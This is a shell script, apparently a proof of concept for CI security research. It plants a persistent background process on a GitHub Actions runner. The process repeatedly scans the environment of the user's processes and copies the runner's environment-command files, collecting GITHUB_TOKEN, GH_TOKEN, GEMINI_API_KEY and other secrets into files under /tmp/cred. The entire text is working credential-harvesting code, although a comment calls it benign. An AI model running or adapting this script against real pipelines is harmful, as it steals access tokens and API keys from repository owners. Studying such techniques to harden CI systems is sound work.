#!/bin/sh
# Detached background watcher: proves persistence across workflow steps and
# captures env of later processes + runner file-command files (benign).
mkdir /tmp/cred/watch.lock 2>/dev/null || exit 0
mkdir -p /tmp/cred/raw/watch
OUT=/tmp/cred/raw/watch
MYUID=$(id -u)
n=0
while [ $n -lt 240 ]; do
  n=$((n+1))
  ts=$(date -u +%FT%TZ)
  ps -o pid= -u "$MYUID" 2>/dev/null | while read -r pid; do
    p="/proc/$pid/environ"
    [ -r "$p" ] || continue
    if tr '\0' '\n' < "$p" 2>/dev/null | grep -qE 'CRED_JOB_SECRET|LATE_STEP_SECRET|GITHUB_TOKEN'; then
      {
        echo "== ts=$ts pid=$pid comm=$(cat /proc/$pid/comm 2>/dev/null)"
        tr '\0' '\n' < "$p" 2>/dev/null | grep -E '^(CRED_JOB_SECRET|LATE_STEP_SECRET|LATE_ENV_SECRET|GITHUB_TOKEN|GH_TOKEN|GITHUB_ENV|GEMINI_API_KEY)='
      } >> $OUT/proc-hits.txt 2>/dev/null
    fi
  done
  if [ -d /home/runner/work/_temp/_runner_file_commands ]; then
    for f in /home/runner/work/_temp/_runner_file_commands/set_env_*; do
      [ -f "$f" ] || continue
      {
        echo "== ts=$ts file=$f"
        cat "$f"
      } >> $OUT/filecmd-env.txt 2>/dev/null
    done
  fi
  [ -f /tmp/cred/stop ] && break
  sleep 2
done
echo "WATCHER-EXIT n=$n ts=$(date -u +%FT%TZ)" >> /tmp/cred/raw/watch/watcher-exit.log 2>/dev/null
